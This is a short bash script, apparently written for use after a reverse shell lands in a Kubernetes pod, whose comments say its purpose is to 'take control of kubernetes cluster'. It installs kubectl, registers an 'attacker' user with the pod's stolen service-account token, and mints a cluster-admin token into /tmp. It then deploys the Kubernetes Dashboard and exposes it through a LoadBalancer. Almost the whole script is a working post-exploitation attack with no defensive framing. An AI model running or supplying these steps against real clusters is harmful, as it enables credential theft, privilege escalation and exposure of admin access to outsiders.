#!/bin/bash
# Instalk kubectl script
# Christopher Ley 

# install kubectl
if [ ! -f "/usr/local/bin/kubectl" ]; then
	apt update && apt -y install curl
	#Download and install kubectl into pod
	curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
	chmod +x ./kubectl
	mv ./kubectl /usr/local/bin/kubectl
fi

# execute command to take control of kubernetes cluster

# create new user from reverse-shell and using kubectl with kubernetes token
kubectl config set-credentials attacker --token=$(cat /run/secrets/kubernetes.io/serviceaccount/token)

# set context with attacker user
kubectl config set-context sa-context --user=attacker

# Create new cluster-admin-sa token
kubectl create token cluster-admin-sa --namespace default > /tmp/token

# Deploy Kubernetes Dashboard
kubectl apply -f https://raw.githubusercontent.com/kubernetes/dashboard/v2.7.0/aio/deploy/recommended.yaml --token=$(cat /tmp/token)

# Access Kubernetes Dashboard
kubectl patch svc kubernetes-dashboard -n kubernetes-dashboard -p '{"spec": {"type": "LoadBalancer"}}' --token=$(cat /tmp/token)